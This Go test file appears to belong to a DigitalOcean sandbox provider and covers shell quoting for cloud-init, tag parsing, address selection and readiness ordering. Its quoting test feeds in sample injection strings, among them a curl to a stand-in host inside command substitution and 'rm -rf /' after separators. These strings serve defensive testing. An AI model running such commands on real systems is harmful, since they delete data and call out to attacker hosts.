package digitalocean

import (
	"strings"
	"testing"
	"time"
)

// Environment values are user-supplied and land in a root shell during
// cloud-init, so an unquoted value would be command injection into the
// sandbox's own bootstrap.
func TestShellQuoteNeutralisesInjection(t *testing.T) {
	cases := []struct {
		name  string
		value string
	}{
		{"command substitution", "TOKEN=$(curl evil.example)"},
		{"statement separator", "A=b; rm -rf /"},
		{"backtick", "A=`whoami`"},
		{"embedded single quote", "A=it's"},
		{"quote break attempt", `A=x' ; rm -rf / ; echo '`},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			quoted := shellQuote(testCase.value)

			if !strings.HasPrefix(quoted, "'") || !strings.HasSuffix(quoted, "'") {
				t.Fatalf("value is not wrapped in single quotes: %s", quoted)
			}
			// Every interior quote must be escaped, so the string cannot be
			// terminated early. Strip the escaped form and no bare quote is left.
			interior := strings.TrimSuffix(strings.TrimPrefix(quoted, "'"), "'")
			if strings.Contains(strings.ReplaceAll(interior, `'\''`, ""), "'") {
				t.Errorf("unescaped quote survives in %s", quoted)
			}
		})
	}
}

func TestIdentifierFromTagsPrefersTag(t *testing.T) {
	tags := []string{tagManaged, tagPrefixID + "abc123", tagPrefixTTL + "1700000000"}
	if got := identifierFromTags(tags, "sbx-wrongname"); got != "abc123" {
		t.Errorf("identifier = %q, want abc123", got)
	}
}

// Reconciliation must still recognise a droplet whose tags were stripped, or
// a half-created sandbox becomes invisible and bills forever.
func TestIdentifierFromTagsFallsBackToName(t *testing.T) {
	if got := identifierFromTags(nil, "sbx-fallback"); got != "fallback" {
		t.Errorf("identifier = %q, want fallback", got)
	}
}

func TestExpiryFromTags(t *testing.T) {
	expires, found := expiryFromTags([]string{tagManaged, tagPrefixTTL + "1700000000"})
	if !found {
		t.Fatal("expected an expiry tag to be found")
	}
	if !expires.Equal(time.Unix(1700000000, 0).UTC()) {
		t.Errorf("expiry = %s", expires)
	}
}

func TestExpiryFromTagsIgnoresGarbage(t *testing.T) {
	if _, found := expiryFromTags([]string{tagPrefixTTL + "not-a-number"}); found {
		t.Error("a malformed expiry tag should not parse")
	}
}

func TestPublicAddressSkipsPrivateNetworks(t *testing.T) {
	var instance droplet
	instance.Networks.V4 = []struct {
		Address string `json:"ip_address"`
		Type    string `json:"type"`
	}{
		{Address: "10.0.0.5", Type: "private"},
		{Address: "203.0.113.7", Type: "public"},
	}
	if got := instance.publicAddress(); got != "203.0.113.7" {
		t.Errorf("publicAddress = %q, want the public one", got)
	}
}

// cloud-init must mark readiness only after the image is pulled and the
// container is running. A droplet reporting active says nothing about that.
func TestCloudInitSignalsReadinessAfterContainerStarts(t *testing.T) {
	var rendered strings.Builder
	err := cloudInit.Execute(&rendered, struct {
		Image         string
		Container     string
		Environment   []string
		ExpirySeconds int
	}{Image: "ghcr.io/example/base:tag", Container: containerName, ExpirySeconds: 1800})
	if err != nil {
		t.Fatalf("cloudInit: %v", err)
	}

	script := rendered.String()
	pull := strings.Index(script, "docker pull")
	ready := strings.Index(script, "touch /run/sbx-ready")
	if pull == -1 || ready == -1 {
		t.Fatalf("cloud-init missing pull or readiness marker:\n%s", script)
	}
	if ready < pull {
		t.Error("readiness marker is written before the image is pulled")
	}
	if !strings.Contains(script, "--on-active=1800s") {
		t.Error("expiry backstop not wired to the TTL")
	}
}
